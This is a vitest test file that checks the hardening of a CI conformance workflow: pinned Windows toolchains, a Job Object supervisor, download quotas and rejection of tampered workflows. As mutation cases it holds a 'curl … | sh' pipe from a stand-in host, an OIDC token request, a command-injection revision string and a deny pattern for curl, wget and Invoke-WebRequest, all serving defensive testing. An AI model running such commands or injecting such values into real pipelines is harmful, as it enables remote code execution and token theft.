import { execFileSync } from 'node:child_process';
import { createHash } from 'node:crypto';
import { existsSync, readFileSync } from 'node:fs';
import { dirname, resolve } from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';

import { describe, expect, test } from 'vitest';

const projectRoot = resolve(dirname(fileURLToPath(import.meta.url)), '..');
const workflowPath = resolve(projectRoot, '.github', 'workflows', 'client-v1-conformance.yml');
const harnessPath = resolve(projectRoot, 'scripts', 'phase1-conformance.mjs');
const validatorRoot =
  process.env.OPENCOVEN_SDK_VALIDATOR_ROOT ??
  resolve(projectRoot, '..', 'build-conformance-contract');
const validatorAvailable = existsSync(
  resolve(validatorRoot, 'scripts', 'github-conformance-evidence.mjs'),
);
const matrixPlatformExpression = '${' + '{ matrix.platform }}';
const validatorInputExpression = '${' + '{ inputs.validator_revision }}';
const reviewedWindowsPins = {
  OPENCOVEN_WINDOWS_IMAGE_OS: 'win25',
  OPENCOVEN_WINDOWS_IMAGE_VERSION: '20260824.239.3',
  OPENCOVEN_WINDOWS_BUILD: '26100.33296',
  OPENCOVEN_WINDOWS_KERNEL32_VERSION: '10.0.26100.33296',
  OPENCOVEN_WINDOWS_POWERSHELL_VERSION: '7.6.5',
  OPENCOVEN_WINDOWS_POWERSHELL_PATH: 'C:\\Program Files\\PowerShell\\7\\pwsh.exe',
  OPENCOVEN_WINDOWS_DOTNET_VERSION: '10.0.11',
  OPENCOVEN_WINDOWS_MSVC_VERSION: '14.50.35717',
  OPENCOVEN_WINDOWS_MSVC_PATH:
    'C:\\Program Files\\Microsoft Visual Studio\\2022\\Enterprise\\VC\\Tools\\MSVC\\14.50.35717',
  OPENCOVEN_WINDOWS_SDK_VERSION: '10.0.26100.0',
  OPENCOVEN_WINDOWS_RC_PATH:
    'C:\\Program Files (x86)\\Windows Kits\\10\\bin\\10.0.26100.0\\x64\\rc.exe',
} as const;

function sha256(bytes: string | Buffer): string {
  return createHash('sha256').update(bytes).digest('hex');
}

function workflowStep(workflow: string, name: string): string {
  const start = workflow.indexOf(`      - name: ${name}`);
  if (start < 0) {
    throw new Error(`missing workflow step: ${name}`);
  }
  const end = workflow.indexOf('\n      - ', start + 1);
  return workflow.slice(start, end < 0 ? workflow.length : end);
}

function embeddedWindowsSupervisorSource(workflow: string): string {
  const startMarker = "          $jobSupervisorSource = @'\n";
  const endMarker = "\n          '@\n";
  const start = workflow.indexOf(startMarker);
  if (start < 0) {
    throw new Error('missing inline Windows Job Object supervisor source');
  }
  const end = workflow.indexOf(endMarker, start + startMarker.length);
  if (end < 0) {
    throw new Error('unterminated inline Windows Job Object supervisor source');
  }
  return `${workflow
    .slice(start + startMarker.length, end)
    .split('\n')
    .map((line) => line.replace(/^ {10}/u, ''))
    .join('\n')}\n`;
}

function workflowRunBody(step: string): string {
  const marker = '        run: |\n';
  const start = step.indexOf(marker);
  if (start < 0) {
    throw new Error('workflow step has no literal run body');
  }
  return step.slice(start + marker.length);
}

function workflowStepEnvironment(step: string): string {
  const start = step.indexOf('        env:\n');
  const end = step.indexOf('        run: |\n');
  if (start < 0 || end < start) {
    throw new Error('workflow step has no environment before its run body');
  }
  return step.slice(start, end);
}

async function workflowFixture() {
  const { verifyProtectedWorkflow } = await import(
    pathToFileURL(resolve(validatorRoot, 'scripts', 'github-conformance-evidence.mjs')).href
  );
  const workflow = readFileSync(workflowPath, 'utf8');
  const harness = readFileSync(harnessPath);
  const producerCommit = 'f'.repeat(40);
  const producer = {
    status: 'compatible',
    repository: 'OpenCoven/chat',
    commit: producerCommit,
    tree: 'e'.repeat(40),
    packageManifest: {
      path: 'package.json',
      size: 1,
      sha256: '1'.repeat(64),
    },
    harness: {
      path: 'scripts/phase1-conformance.mjs',
      version: '2.0.0',
      size: harness.byteLength,
      sha256: sha256(harness),
    },
    command: 'test:phase1-conformance',
    recordSchemaVersion: 2,
    workflow: {
      name: 'client-v1 conformance',
      path: '.github/workflows/client-v1-conformance.yml',
      size: Buffer.byteLength(workflow, 'utf8'),
      sha256: sha256(workflow),
      job: 'platform-conformance',
      jobNameTemplate: 'platform-conformance ({platform})',
      aggregationJob: 'aggregate-conformance',
      aggregationJobName: 'aggregate-conformance',
      aggregationRunnerLabels: ['ubuntu-24.04'],
      environment: 'client-v1-conformance',
      environmentId: '20863036831',
      artifactNameTemplate: 'client-v1-conformance-{platform}',
      recordPathTemplate: '.artifacts/client-v1-conformance-{platform}.json',
      sourceRef: 'refs/heads/main',
      runnerLabels: {
        'darwin-arm64': ['macos-14'],
        'linux-x64': ['ubuntu-24.04'],
        'win32-x64': ['windows-2025'],
      },
      signerWorkflow: 'OpenCoven/chat/.github/workflows/client-v1-conformance.yml',
      signerDigest: producerCommit,
      sourceDigest: producerCommit,
      predicateType: 'https://slsa.dev/provenance/v1',
      denySelfHostedRunners: true,
    },
  };
  const toolchain = {
    nodeVersion: 'v24.18.1',
    pnpmVersion: 'pnpm@10.34.0',
    rustVersion: '1.95.0',
    tauriVersion: '2.11.4',
  };

  return { producer, toolchain, verifyProtectedWorkflow, workflow };
}

describe.skipIf(!validatorAvailable)('protected client-v1 conformance workflow', () => {
  test('is expected to be rejected by the pre-repin SDK workflow validator', async () => {
    const fixture = await workflowFixture();
    expect(fixture.workflow).toContain('      validator_revision:');
    expect(fixture.workflow).toContain('        required: true');
    expect(fixture.workflow).toContain('        type: string');
    expect(fixture.workflow).toContain(
      `          OPENCOVEN_VALIDATOR_REVISION: ${validatorInputExpression}`,
    );
    expect(fixture.workflow).toContain('--validator-revision "$OPENCOVEN_VALIDATOR_REVISION"');
    expect(() =>
      fixture.verifyProtectedWorkflow(fixture.workflow, fixture.producer, fixture.toolchain),
    ).toThrow(/workflow/u);
  });

  test.each([
    [
      'disabled official upload',
      (workflow: string) =>
        workflow.replace(
          '      - uses: actions/upload-artifact@',
          '      - if: false\n        uses: actions/upload-artifact@',
        ),
    ],
    [
      'missing validator input',
      (workflow: string) =>
        workflow.replace(
          [
            '    inputs:',
            '      validator_revision:',
            '        required: true',
            '        type: string',
            '',
          ].join('\n'),
          '',
        ),
    ],
    [
      'optional validator input',
      (workflow: string) => workflow.replace('        required: true', '        required: false'),
    ],
    [
      'defaulted validator input',
      (workflow: string) =>
        workflow.replace('        type: string', '        type: string\n        default: main'),
    ],
    [
      'direct validator expression in shell',
      (workflow: string) =>
        workflow.replace('"$OPENCOVEN_VALIDATOR_REVISION"', `"${validatorInputExpression}"`),
    ],
    [
      'changed validator environment name',
      (workflow: string) =>
        workflow.replace('OPENCOVEN_VALIDATOR_REVISION:', 'UNREVIEWED_VALIDATOR_REVISION:'),
    ],
    [
      'disabled Linux Secret Service setup',
      (workflow: string) =>
        workflow.replace("        if: matrix.platform == 'linux-x64'", '        if: false'),
    ],
    [
      'substituted Linux Secret Service setup',
      (workflow: string) =>
        workflow.replace(
          'node scripts/phase1-linux-secret-service.mjs --install',
          'curl https://example.invalid/install.sh | sh',
        ),
    ],
    [
      'sibling action',
      (workflow: string) =>
        workflow.replace(
          '      - uses: actions/upload-artifact@',
          '      - uses: ./unsafe-local-action\n      - uses: actions/upload-artifact@',
        ),
    ],
    [
      'OIDC request',
      (workflow: string) =>
        workflow.replace(
          '      - uses: actions/upload-artifact@',
          '      - run: curl "$ACTIONS_ID_TOKEN_REQUEST_URL"\n      - uses: actions/upload-artifact@',
        ),
    ],
    [
      'artifact substitution',
      (workflow: string) =>
        workflow.replace(
          `          path: .artifacts/client-v1-conformance-${matrixPlatformExpression}.json`,
          '          path: .artifacts/replacement.json',
        ),
    ],
    [
      'mutation after validation',
      (workflow: string) =>
        workflow.replace(
          '      - uses: actions/upload-artifact@',
          '      - run: node scripts/rewrite-evidence.mjs\n      - uses: actions/upload-artifact@',
        ),
    ],
    [
      'dynamic artifact name',
      (workflow: string) =>
        workflow.replace(
          `          name: client-v1-conformance-${matrixPlatformExpression}`,
          '          name: $' + "{{ format('client-v1-conformance-{0}', matrix.platform) }}",
        ),
    ],
    [
      'YAML anchor',
      (workflow: string) =>
        workflow.replace(
          'permissions:\n',
          'x-permissions: &evidence-permissions\n  contents: read\npermissions:\n',
        ),
    ],
    [
      'YAML alias',
      (workflow: string) =>
        workflow.replace(
          'permissions:\n',
          'x-value: &evidence-value read\nx-copy: *evidence-value\npermissions:\n',
        ),
    ],
    [
      'YAML merge key',
      (workflow: string) =>
        workflow.replace(
          'permissions:\n',
          'x-defaults: &defaults\n  contents: read\nx-merged:\n  <<: *defaults\npermissions:\n',
        ),
    ],
    [
      'multiline curl',
      (workflow: string) =>
        workflow.replace(
          '      - uses: actions/upload-artifact@',
          '      - run: >-\n          curl https://example.invalid\n      - uses: actions/upload-artifact@',
        ),
    ],
    [
      'multiline gh',
      (workflow: string) =>
        workflow.replace(
          '      - uses: actions/upload-artifact@',
          '      - run: |-\n          gh attestation verify record.json\n      - uses: actions/upload-artifact@',
        ),
    ],
  ])('rejects %s', async (_label, mutate) => {
    const fixture = await workflowFixture();
    const workflow = mutate(fixture.workflow);
    const producer = {
      ...fixture.producer,
      workflow: {
        ...fixture.producer.workflow,
        size: Buffer.byteLength(workflow, 'utf8'),
        sha256: sha256(workflow),
      },
    };

    expect(() => fixture.verifyProtectedWorkflow(workflow, producer, fixture.toolchain)).toThrow(
      /workflow/u,
    );
  });
});

describe('Chat-local protected Windows conformance workflow', () => {
  test('passes validator revision only through step env and validates it before child construction', () => {
    const workflow = readFileSync(workflowPath, 'utf8');
    const bootstrap = workflowStep(workflow, 'Bootstrap supervised Windows conformance');
    const environment = workflowStepEnvironment(bootstrap);
    const runBody = workflowRunBody(bootstrap);

    expect(environment).toContain(
      `OPENCOVEN_VALIDATOR_REVISION_INPUT: ${validatorInputExpression}`,
    );
    expect(runBody).not.toContain(validatorInputExpression);
    expect(runBody).not.toMatch(/\$\{\{\s*inputs\./u);
    expect(runBody).toMatch(
      /\$validatorRevision = Require-LowercaseGitOid\s+`\s+-Value \$env:OPENCOVEN_VALIDATOR_REVISION_INPUT/u,
    );
    expect(runBody.indexOf('$validatorRevision = Require-LowercaseGitOid')).toBeLessThan(
      runBody.indexOf('$childEnvironment = [ordered]@{'),
    );
    expect(runBody).toContain('OPENCOVEN_VALIDATOR_REVISION = $validatorRevision');
  });

  test.each([
    "'; Write-Host injected; '",
    '$' + '{{ github.token }}',
    '{not-an-oid}',
    'a'.repeat(39),
    'A'.repeat(40),
    `${'a'.repeat(20)}\n${'b'.repeat(20)}`,
    `${'a'.repeat(20)};${'b'.repeat(19)}`,
  ])('the exact workflow validator rejects adversarial revision %j', (revision) => {
    const workflow = readFileSync(workflowPath, 'utf8');
    const runBody = workflowRunBody(
      workflowStep(workflow, 'Bootstrap supervised Windows conformance'),
    );
    const functionStart = runBody.indexOf('          function Require-LowercaseGitOid {');
    const functionEnd = runBody.indexOf('\n          }\n', functionStart);
    expect(functionStart).toBeGreaterThanOrEqual(0);
    expect(functionEnd).toBeGreaterThan(functionStart);
    const functionSource = runBody
      .slice(functionStart, functionEnd + '\n          }\n'.length)
      .split('\n')
      .map((line) => line.replace(/^ {10}/u, ''))
      .join('\n');
    expect(() =>
      execFileSync(
        'pwsh',
        [
          '-NoLogo',
          '-NoProfile',
          '-NonInteractive',
          '-Command',
          `${functionSource}\nRequire-LowercaseGitOid -Value $env:TEST_REVISION`,
        ],
        {
          encoding: 'utf8',
          env: { ...process.env, TEST_REVISION: revision },
          stdio: ['ignore', 'pipe', 'pipe'],
        },
      ),
    ).toThrow();
  });

  test('runs one inline supervised Windows production before every action or repository command', () => {
    const workflow = readFileSync(workflowPath, 'utf8');
    const stepsStart = workflow.indexOf('    steps:\n');
    const bootstrapStart = workflow.indexOf(
      '      - name: Bootstrap supervised Windows conformance',
      stepsStart,
    );
    const firstAction = workflow.indexOf('      - uses:', stepsStart);

    expect(bootstrapStart).toBe(stepsStart + '    steps:\n'.length);
    expect(bootstrapStart).toBeLessThan(firstAction);
    expect(workflowStep(workflow, 'Bootstrap supervised Windows conformance')).toMatch(
      /if: matrix\.platform == 'win32-x64'[\s\S]*?shell: pwsh[\s\S]*?run: \|/u,
    );
    expect(workflow).not.toContain('workflow_call:');
    expect(workflow).not.toMatch(/uses:\s+(?:\.\/|[^@\s]+\/\.github\/workflows\/)/u);

    for (const name of [
      'Install frozen dependencies',
      'Set up frozen Rust',
      'Install frozen Linux Secret Service',
      'Require frozen toolchain',
      'Verify frozen harness bytes',
      'Produce platform evidence',
      'Validate canonical platform record',
    ]) {
      expect(workflowStep(workflow, name)).toContain("if: matrix.platform != 'win32-x64'");
    }

    for (const action of ['actions/checkout@', 'actions/setup-node@', 'pnpm/action-setup@']) {
      const actionStart = workflow.indexOf(`      - uses: ${action}`);
      const actionEnd = workflow.indexOf('\n      - ', actionStart + 1);
      const step = workflow.slice(actionStart, actionEnd);
      expect(actionStart).toBeGreaterThan(bootstrapStart);
      expect(step).toContain("if: matrix.platform != 'win32-x64'");
    }

    const platformSteps = workflow
      .slice(stepsStart, workflow.indexOf('\n  aggregate-conformance:'))
      .split('\n      - ')
      .slice(1);
    for (const step of platformSteps) {
      if (
        step.startsWith('name: Bootstrap supervised Windows conformance') ||
        step.startsWith('uses: actions/upload-artifact@') ||
        step.startsWith('uses: actions/attest-build-provenance@')
      ) {
        continue;
      }
      if (
        /(?:actions\/checkout|actions\/setup-node|pnpm\/action-setup|\bgit\b|\bnode\b|corepack|pnpm|rustup|rustc|cargo)/u.test(
          step,
        )
      ) {
        expect(step).toContain("if: matrix.platform != 'win32-x64'");
      }
    }
  });

  test('contains the reviewed suspended-create Job Object supervisor with fail-closed bounds', () => {
    const workflow = readFileSync(workflowPath, 'utf8');
    const embedded = embeddedWindowsSupervisorSource(workflow);
    const production = readFileSync(
      resolve(projectRoot, 'scripts', 'windows-job-supervisor.cs'),
      'utf8',
    );
    expect(embedded).toBe(production);
    const sources = [embedded, production];

    for (const source of sources) {
      for (const required of [
        'CreateProcessW',
        'CREATE_SUSPENDED',
        'AssignProcessToJobObject',
        'IsProcessInJob',
        'ResumeThread',
        'SetInformationJobObject',
        'JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE',
        'CreatePipe',
        'TerminateJobObject',
        'MaxStdoutBytes',
        'MaxStderrBytes',
        'TotalTimeout',
        'WindowsDirectoryQuota',
        'ResourceQuotaExceeded',
        'MeasureDirectoryBytes',
        'WaitForSingleObject',
        'CloseHandle',
      ]) {
        expect(source).toContain(required);
      }
      expect(source).not.toContain('JOB_OBJECT_LIMIT_BREAKAWAY_OK');
      expect(source).not.toContain('JOB_OBJECT_LIMIT_SILENT_BREAKAWAY_OK');
    }
  });

  test('runs the native Job Object tree tests in the ordinary Windows CI job', () => {
    const workflow = readFileSync(resolve(projectRoot, '.github', 'workflows', 'ci.yml'), 'utf8');
    const windowsJob = workflow.slice(workflow.indexOf('  windows-supervisor-behavior:'));
    const runtimeTest = readFileSync(
      resolve(projectRoot, 'scripts', 'windows-job-supervisor.test.ps1'),
      'utf8',
    );

    expect(windowsJob.indexOf('Build phase1 native RPC')).toBeLessThan(
      windowsJob.indexOf('Test Windows Job Object supervision'),
    );
    expect(windowsJob).toContain(
      'cargo build --manifest-path src-tauri/Cargo.toml --features phase1-conformance --bin phase1-native-rpc',
    );
    expect(windowsJob).toContain(
      'OPENCOVEN_PHASE1_NATIVE_RPC_PATH: src-tauri\\target\\debug\\phase1-native-rpc.exe',
    );
    expect(windowsJob).toContain('name: Test Windows Job Object supervision');
    expect(windowsJob).toContain(
      'pwsh -NoLogo -NoProfile -NonInteractive -File scripts/windows-job-supervisor.test.ps1',
    );
    for (const requiredCase of [
      'Positive Job Object membership failed.',
      'A process in Job B was accepted as a member of existing Job A.',
      'An unsupervised process was accepted as a member of an existing Job.',
      'Ordinary non-evidence native RPC execution changed.',
      'Missing native Job binding',
      'Malformed native evidence mode',
      'Malformed native Job binding',
      'Nonexistent native Job binding',
      'Unsupervised native process with valid existing Job A binding',
      'Wrong existing native Job binding',
      'Valid native Job binding did not reach native RPC startup.',
      'Directory quota excess did not fail closed.',
    ]) {
      expect(runtimeTest).toContain(requiredCase);
    }
  });

  test('pins and verifies the complete supervised Windows bootstrap and evidence tree', () => {
    const workflow = readFileSync(workflowPath, 'utf8');
    const bootstrap = workflowStep(workflow, 'Bootstrap supervised Windows conformance');
    const environment = workflowStepEnvironment(bootstrap);
    const runBody = workflowRunBody(bootstrap);

    for (const required of [
      'windows-2025',
      'AMD64',
      'C:\\Program Files\\PowerShell\\7\\pwsh.exe',
      'C:\\Windows\\System32\\kernel32.dll',
      'node-v24.18.1-win-x64.zip',
      'pnpm-10.34.0.tgz',
      'rustup-init.exe',
      '1.95.0',
      'PortableGit',
      'Get-FileHash',
      'SHA256',
      'https://',
      'git fetch',
      'pnpm install --frozen-lockfile --ignore-scripts',
      'windows-job-supervisor.test.ps1',
      'phase1-conformance.mjs',
      'Validate canonical platform record',
      'OPENCOVEN_WINDOWS_JOB_REQUIRED',
      'OPENCOVEN_WINDOWS_JOB_NONCE',
      'OPENCOVEN_WINDOWS_JOB_NAME',
      'Get-AuthenticodeSignature',
      'ResourceQuotaExceeded',
      'phase1-conformance-run-*\\checkouts\\sdk',
      'phase1-conformance-run-*\\checkouts\\chat',
      'phase1-conformance-run-*\\checkouts\\cave',
      'phase1-conformance-run-*\\checkouts\\coven',
      'phase1-conformance-run-*\\checkouts\\validator',
      'phase1-conformance-run-*\\checkouts\\producer',
      'phase1-conformance-run-*\\cargo-home\\registry',
      'phase1-conformance-run-*\\cargo-home\\git',
      'phase1-conformance-run-*\\pnpm-store',
      'phase1-conformance-run-*\\build',
    ]) {
      expect(bootstrap).toContain(required);
    }
    for (const [name, value] of Object.entries(reviewedWindowsPins)) {
      expect(environment).toContain(`${name}: '${value}'`);
      expect(runBody).toContain(`$env:${name}`);
    }
    expect(runBody).not.toMatch(/Sort-Object[\s\S]*Select-Object -First 1/u);
    expect(runBody).not.toMatch(/-notin @\('7\./u);
    expect(runBody).not.toMatch(/StartsWith\(\s*'10\.0\.26100\.'/u);
    expect(runBody).toContain('AllowAutoRedirect = $false');
    expect(runBody).toContain('-AllowedRedirectHosts');
    expect(runBody).toContain('-MaximumRedirects');
    expect(runBody).toContain("'github.com', 'release-assets.githubusercontent.com'");
    expect(runBody).not.toContain("'objects.githubusercontent.com'");
    expect(runBody).toContain('--config.store-dir=$($env:PNPM_STORE_DIR)');
    expect(runBody).toContain('CARGO_NET_GIT_FETCH_WITH_CLI');
    expect(bootstrap).not.toMatch(/\b(?:curl|wget|Invoke-WebRequest)\b/u);
    expect(bootstrap).not.toContain('http://');
    expect(bootstrap).toMatch(/[0-9a-f]{64}/u);
  });

  test('guards each Windows network and bootstrap phase with reviewed quotas', () => {
    const bootstrap = workflowRunBody(
      workflowStep(readFileSync(workflowPath, 'utf8'), 'Bootstrap supervised Windows conformance'),
    );
    const requiredQuotaRoots = [
      "Join-Path $bootstrapRoot 'downloads'",
      "Join-Path $bootstrapRoot 'tools\\git'",
      "Join-Path $bootstrapRoot 'tools\\node'",
      "Join-Path $bootstrapRoot 'tools\\pnpm'",
      "Join-Path $bootstrapRoot 'rustup'",
      "Join-Path $bootstrapRoot 'cargo\\registry'",
      "Join-Path $bootstrapRoot 'cargo\\git'",
      "Join-Path $bootstrapRoot 'pnpm-store'",
      "Join-Path $workspace '.git\\objects'",
      "Join-Path $bootstrapRoot 'phase1-conformance-run-*\\checkouts\\sdk'",
      "Join-Path $bootstrapRoot 'phase1-conformance-run-*\\checkouts\\chat'",
      "Join-Path $bootstrapRoot 'phase1-conformance-run-*\\checkouts\\cave'",
      "Join-Path $bootstrapRoot 'phase1-conformance-run-*\\checkouts\\coven'",
      "Join-Path $bootstrapRoot 'phase1-conformance-run-*\\checkouts\\validator'",
      "Join-Path $bootstrapRoot 'phase1-conformance-run-*\\checkouts\\producer'",
      "Join-Path $bootstrapRoot 'phase1-conformance-run-*\\build'",
    ];
    for (const quotaRoot of requiredQuotaRoots) {
      expect(bootstrap).toContain(quotaRoot);
    }
    for (const [label, limit] of [
      ['bootstrap aggregate', '12GB'],
      ['workspace aggregate', '2GB'],
      ['direct downloads', '128MB'],
      ['protected Chat Git objects', '512MB'],
      ['SDK checkout', '768MB'],
      ['Chat checkout', '768MB'],
      ['Cave checkout', '768MB'],
      ['Coven checkout', '768MB'],
      ['validator checkout', '768MB'],
      ['producer checkout', '768MB'],
      ['rustup toolchains', '1GB'],
      ['bootstrap Cargo registry', '2GB'],
      ['bootstrap Cargo git', '1GB'],
      ['bootstrap pnpm store', '3GB'],
      ['harness Cargo registry', '2GB'],
      ['harness Cargo git', '1GB'],
      ['harness pnpm store', '3GB'],
      ['harness build roots', '4GB'],
      ['harness execution aggregate', '10GB'],
    ] as const) {
      expect(bootstrap).toMatch(
        new RegExp(`'${label}'[\\s\\S]{0,180}\\n\\s+${limit.replace('.', '\\.')}`, 'u'),
      );
    }
    expect(bootstrap).toContain('$job.Run(');
    expect(bootstrap).toContain('$directoryQuotas');
    expect(bootstrap).toContain('Supervised Windows production exceeded a resource quota.');
  });
});
